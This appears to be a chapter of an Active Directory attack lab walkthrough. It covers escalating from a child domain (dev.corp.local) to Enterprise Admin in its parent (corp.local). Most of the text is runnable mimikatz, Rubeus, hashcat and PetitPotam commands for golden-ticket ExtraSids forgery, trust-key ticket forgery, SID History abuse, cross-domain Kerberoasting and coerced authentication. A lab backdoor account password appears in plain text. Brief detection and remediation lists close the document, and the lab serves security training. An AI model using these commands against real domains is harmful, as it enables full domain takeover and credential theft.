# 08 — Cross-Domain Attacks

## Overview

The lab has a parent-child trust between `corp.local` (parent) and `dev.corp.local` (child).
A two-way transitive trust exists by default in this topology.

**Goal:** Compromise `corp.local` Enterprise Admins starting from `dev.corp.local`.

---

## Attack 1: ExtraSids (Child-to-Parent Escalation)

After compromising dev.corp.local, forge a Golden Ticket with the Enterprise Admins SID from corp.local appended in the ExtraSids field.

### Prerequisites

- DA rights in dev.corp.local
- `krbtgt` hash of dev.corp.local
- Enterprise Admins SID from corp.local

### Steps

```powershell
# Step 1: Get dev.corp.local krbtgt hash
.\mimikatz.exe "lsadump::dcsync /domain:dev.corp.local /user:krbtgt" exit
# Note: NTLM Hash, Domain SID

# Step 2: Get Enterprise Admins SID from corp.local
Get-ADGroup -Server 192.168.56.10 -Identity "Enterprise Admins" | Select-Object SID
# Example: S-1-5-21-CORP-SID-519

# Step 3: Get dev.corp.local domain SID
(Get-ADDomain dev.corp.local).DomainSID.Value
# Example: S-1-5-21-DEV-SID

# Step 4: Forge the ticket (mimikatz)
.\mimikatz.exe `
  "kerberos::golden /user:Administrator /domain:dev.corp.local /sid:S-1-5-21-DEV-SID /sids:S-1-5-21-CORP-SID-519 /krbtgt:<DEV-KRBTGT-HASH> /ptt" exit

# Step 5: Access parent domain resources
dir \\DC-01.corp.local\C$
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```

---

## Attack 2: Trust Ticket (Inter-Realm TGT Forgery)

Use the inter-realm trust key (shared secret between parent and child DC) to forge a referral TGT to corp.local.

```powershell
# Step 1: Dump trust key on dev.corp.local DC
.\mimikatz.exe "lsadump::trust /patch" exit
# Look for: [  In ] CORP.LOCAL -> DEV.CORP.LOCAL  (RC4 HMAC hash)

# Step 2: Forge a trust ticket targeting corp.local
.\mimikatz.exe `
  "kerberos::golden /user:Administrator /domain:dev.corp.local /sid:S-1-5-21-DEV-SID /sids:S-1-5-21-CORP-SID-519 /rc4:<TRUST-KEY-HASH> /service:krbtgt /target:corp.local /ptt" exit

# Step 3: Request a service ticket for corp.local using the trust ticket
.\Rubeus.exe asktgs /ticket:<base64-trust-ticket> /service:CIFS/DC-01.corp.local /nowrap /ptt

dir \\DC-01.corp.local\C$
```

---

## Attack 3: SID History Abuse

```powershell
# dev.backdoor has corp.local Enterprise Admins SID in its SIDHistory
# (configured by Setup-DevCorpLocal.ps1)

# Log in as dev.backdoor:
# dev.corp.local\dev.backdoor / p@ssw0rd

# Access corp.local resources directly
dir \\DC-01.corp.local\C$

# Or dump corp.local via DCSync
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```

---

## Attack 4: Cross-Domain Kerberoasting

```powershell
# From dev.corp.local, request TGS tickets for corp.local service accounts
# (requires inter-domain trust)
.\Rubeus.exe kerberoast /domain:corp.local /dc:192.168.56.10 /nowrap /format:hashcat

# Crack:
hashcat -m 13100 cross-domain-hashes.txt rockyou.txt
```

---

## Attack 5: Printer Bug / PetitPotam Cross-Domain

```powershell
# Coerce DC-02 (dev.corp.local) to authenticate to an attacker-controlled machine
# The TGT from DC-02$ can be used for S4U attacks

# From WS-01 with Rubeus monitoring:
.\Rubeus.exe monitor /interval:1 /filteruser:DC-02$

# Trigger authentication from DC-02
python3 PetitPotam.py 192.168.56.30 192.168.56.20

# Inject captured TGT and act as DC-02$
.\Rubeus.exe ptt /ticket:<base64>
```

---

## Trust Enumeration

```powershell
# Enumerate all trusts
Get-DomainTrust
nltest /domain_trusts /all_trusts /v

# From dev.corp.local, find corp.local objects
Get-DomainUser -Domain corp.local
Get-DomainGroup -Domain corp.local -Identity "Domain Admins"
Get-DomainComputer -Domain corp.local

# BloodHound cross-domain query
# "Find Shortest Paths to Enterprise Admins"
```

---

## Detection

- Monitor cross-domain TGT requests with unusual SIDs in ExtraSids field
- Event 4768 from child DC with SIDs not belonging to that domain
- Alert on changes to trust objects (Event 4706/4707)
- Monitor `sidHistory` attribute changes (Event 4765/4766)

## Remediation

- Enable SID Filtering on all trusts (breaks SID History abuse and ExtraSids)
- Rotate `krbtgt` password in both domains after any compromise
- Use Selective Authentication to limit cross-domain access
- Enable "Quarantine" mode on trusts with untrusted domains
